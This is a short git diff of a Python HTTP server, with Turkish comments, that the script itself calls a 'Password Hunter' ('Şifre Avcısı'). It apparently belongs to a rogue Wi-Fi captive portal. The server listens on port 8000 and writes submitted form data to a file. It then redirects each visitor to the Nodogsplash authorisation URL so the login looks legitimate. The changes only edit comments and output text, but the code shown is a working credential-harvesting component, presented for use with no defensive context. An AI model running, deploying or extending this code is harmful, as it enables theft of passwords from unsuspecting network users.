@@ -22,19 +22,16 @@ class LoggerHandler(BaseHTTPRequestHandler):
             except Exception as e:
                 print(f"[!] Dosya yazma hatası: {e}")
 
-        # Nodogsplash'e 'Temiz' onay gönder
-        # Artık form verileri Nodogsplash'e gitmeyeceği için 'Token is invalid' hatası almazsın
         self.send_response(302)
-        # NDS portu olan 2050 üzerinden yetkilendirme linkine fırlatıyoruz
+        # NDS portu olan 2050 üzerinden yetkilendirme linkine fırlatılır
         self.send_header('Location', 'http://192.168.12.1:2050/nodogsplash_auth/')
         self.end_headers()
 
 def run():
-    # 0.0.0.0 sayesinde hem 127.0.0.1 hem 192.168.12.1 üzerinden gelenleri yakalarız
     server_address = ('0.0.0.0', 8000)
     httpd = HTTPServer(server_address, LoggerHandler)
     print("------------------------------------------")
-    print("[+] Şifre Avcısı 8000 Portunda Aktif!")
+    print("[+] Şifre Avcısı 8000 Portunda Aktif")
     print("[+] Bekleniyor...")
     print("------------------------------------------")
     httpd.serve_forever()
